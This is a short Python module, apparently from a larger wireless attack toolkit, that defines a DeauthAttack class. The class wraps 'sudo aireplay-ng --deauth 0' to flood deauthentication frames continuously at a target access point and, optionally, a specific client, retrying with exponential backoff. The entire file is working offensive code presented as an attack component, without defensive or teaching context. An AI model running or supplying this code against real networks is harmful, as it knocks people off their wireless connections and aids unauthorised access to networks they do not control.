import subprocess
import time
from .config_loader import Config

class DeauthAttack:
    def __init__(self, config: Config):
        self.mon_iface = config.monitor_interface
        self.retries = config.retries_deauth
        self.backoff = config.backoff_factor
        self.timeout = config.timeout_attack

    def run(self, bssid, client=None):
        for attempt in range(1, self.retries + 1):
            cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', bssid]
            if client:
                cmd += ['-c', client]
            cmd += ['-i', self.mon_iface]
            try:
                subprocess.run(cmd, timeout=self.timeout, check=True)
                return True
            except subprocess.TimeoutExpired:
                wait = self.backoff ** attempt
                time.sleep(wait)
            except subprocess.CalledProcessError as e:
                raise RuntimeError(f"Deauth failed: {e}")
        raise RuntimeError(f"Deauth attack failed after {self.retries} retries")